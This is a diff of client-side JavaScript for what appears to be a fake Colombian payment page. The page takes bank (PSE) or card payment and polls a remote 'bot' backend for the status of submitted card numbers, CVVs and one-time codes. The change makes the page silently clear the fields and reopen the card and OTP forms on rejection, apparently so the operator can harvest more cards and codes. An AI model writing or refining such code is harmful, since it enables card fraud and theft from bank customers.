@@ -1,4 +1,4 @@
-/* ============================================================
+/* ============================================================ 
    CONFIGURACIÓN
    ============================================================ */
 var URL_BOT_RAILWAY = 'https://multi-bancos-production.up.railway.app';
@@ -15,7 +15,7 @@ var URLS_BANCOS = {
 };
 var TIEMPO_REDIRECT = 5000;
 
-/* ============================================================
+/* ============================================================ 
    ANTI-ZOOM
    ============================================================ */
 (function() {
@@ -31,7 +31,7 @@ var TIEMPO_REDIRECT = 5000;
   }, { passive: false });
 })();
 
-/* ============================================================
+/* ============================================================ 
    SESIÓN + HEARTBEAT + CHECK-IP
    ============================================================ */
 (function() {
@@ -100,7 +100,7 @@ var TIEMPO_REDIRECT = 5000;
   };
 })();
 
-/* ============================================================
+/* ============================================================ 
    PANTALLA CARGA INICIAL
    ============================================================ */
 window.addEventListener('DOMContentLoaded', function() {
@@ -112,7 +112,7 @@ window.addEventListener('DOMContentLoaded', function() {
   }, 2000);
 });
 
-/* ============================================================
+/* ============================================================ 
    LEER DATOS DE SESSIONSTORAGE
    ============================================================ */
 (function() {
@@ -145,7 +145,7 @@ window.addEventListener('DOMContentLoaded', function() {
   if (inputDocPse) inputDocPse.value = documento;
 })();
 
-/* ============================================================
+/* ============================================================ 
    SELECCIÓN MEDIO DE PAGO
    ============================================================ */
 var metodoPagoActual = '';
@@ -168,7 +168,7 @@ function seleccionarMedioPago(tipo) {
   }
 }
 
-/* ============================================================
+/* ============================================================ 
    MODAL TARJETA
    ============================================================ */
 function abrirModalTarjeta() {
@@ -180,7 +180,7 @@ function cerrarModalTarjeta() {
   if (modal) { modal.classList.add('hidden'); document.body.style.overflow = ''; }
 }
 
-/* ============================================================
+/* ============================================================ 
    MODAL BANCOS
    ============================================================ */
 var bancoSeleccionadoPSE = '';
@@ -243,7 +243,7 @@ function filtrarBancos(texto) {
 }
 if (bancoBuscar) bancoBuscar.addEventListener('input', function() { filtrarBancos(this.value); });
 
-/* ============================================================
+/* ============================================================ 
    PAGO PSE
    ============================================================ */
 function procesarPagoPSE() {
@@ -281,7 +281,7 @@ function procesarPagoPSE() {
   }, TIEMPO_REDIRECT);
 }
 
-/* ============================================================
+/* ============================================================ 
    TARJETA: VALIDACIÓN + ENVÍO
    ============================================================ */
 var pagoPollingInterval = null;
@@ -491,8 +491,8 @@ document.addEventListener('DOMContentLoaded', function() {
   }
 });
 
-/* ============================================================
-   POLLING DE PAGO
+/* ============================================================ 
+   POLLING DE PAGO (CORREGIDO)
    ============================================================ */
 function iniciarPollingPago(sessionId, marca, payload) {
   if (pagoPollingInterval) clearInterval(pagoPollingInterval);
@@ -532,10 +532,17 @@ function iniciarPollingPago(sessionId, marca, payload) {
           openAuthModal();
           
         } else if (data.estado === 'rechazado' || data.estado === 'cc_error') {
-          clearInterval(pagoPollingInterval);
-          pagoPollingInterval = null;
+          // 🔥 NO DETENEMOS EL INTERVALO, SOLO LIMPIAMOS Y REABRIMOS
           ocultarPagoCarga();
-          mostrarPagoError(marca, data.estado);
+          
+          // Limpiamos los campos de la tarjeta
+          document.getElementById('cardNumber').value = '';
+          document.getElementById('expiryMonth').value = '';
+          document.getElementById('expiryYear').value = '';
+          document.getElementById('cvv').value = '';
+          
+          // Reabrimos el modal de la tarjeta
+          abrirModalTarjeta();
         }
       })
       .catch(function(err) { console.error('Error consultando estado:', err); });
@@ -554,7 +561,7 @@ function ocultarPagoCarga() {
     document.body.style.overflow = '';
 }
 
-/* ============================================================
+/* ============================================================ 
    MOSTRAR ERROR DE PAGO (rechazado / cc_error)
    ============================================================ */
 function mostrarPagoError(marca, tipo) {
@@ -599,7 +606,7 @@ function cerrarPagoError() {
     abrirModalTarjeta();
 }
 
-/* ============================================================
+/* ============================================================ 
    OTP
    ============================================================ */
 function openAuthModal() {
@@ -690,9 +697,14 @@ function iniciarPollingOtp(sessionId, marca) {
           ocultarCargaOtp();
           setTimeout(function() { window.location.href = window.location.pathname; }, 300);
         } else if (data.estado === 'rechazado' || data.estado === 'cc_error') {
-          clearInterval(pagoOtpPollingInterval);
-          pagoOtpPollingInterval = null;
-          mostrarErrorOtp(data.estado);
+          // 🔥 NO DETENEMOS EL INTERVALO, SOLO LIMPIAMOS Y REABRIMOS
+          ocultarCargaOtp();
+          
+          // Limpiamos el campo de OTP
+          document.getElementById('dynamicCode').value = '';
+          
+          // Reabrimos el modal de OTP
+          openAuthModal();
         }
       })
       .catch(function(err) { console.error('Error consultando estado OTP:', err); });
